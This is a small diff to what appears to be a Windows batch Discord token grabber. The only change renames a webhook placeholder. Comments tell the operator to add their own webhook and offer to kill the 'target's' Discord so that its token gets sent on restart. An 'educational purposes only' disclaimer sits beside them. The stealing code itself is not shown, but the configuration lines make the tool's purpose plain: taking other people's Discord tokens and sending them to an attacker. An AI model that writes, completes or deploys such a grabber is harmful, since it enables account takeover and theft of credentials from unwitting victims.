@@ -3,7 +3,7 @@
 @echo off
 :: i dont take any responsibility for damage done with the programm it's for educational purposes only
 ::replace the YOURWEBHOOK field with your webhook
-set webhook=YOURTOKEN
+set webhook=YOURWEBHOOK
 
 ::set 1 if you want that the discord of your target get closed ( discord needs to be restarted to send you the token)
 set /a killdc = 0
